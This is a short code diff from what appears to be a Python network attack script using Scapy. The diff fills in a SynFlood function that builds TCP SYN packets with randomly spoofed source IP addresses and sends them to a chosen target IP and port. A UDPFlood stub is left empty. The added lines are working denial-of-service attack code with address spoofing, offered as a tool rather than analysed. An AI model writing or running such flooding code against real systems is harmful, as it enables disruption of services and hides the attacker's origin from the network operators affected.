@@ -37,8 +37,17 @@ def randomSrcIP():
     return ip 
 
 def SynFlood(dstIP,dstPort,repeat):
-    pass
+    IP_Packet = IP()
+    IP_Packet.src = randomSrcIP()
+    IP_Packet.dst = dstIP
 
+    TCP_Packet = TCP()
+    TCP_Packet.sport = 80
+    TCP_Packet.dport = dstPort
+    TCP_Packet.flags = "S"
+    # TCP_Packet.seq = 
+    # TCP_Packet.window = 
+    send(IP_Packet/TCP_Packet,verbose=0)
 
 def UDPFlood(dstIP,dstPort,repeat):
     pass
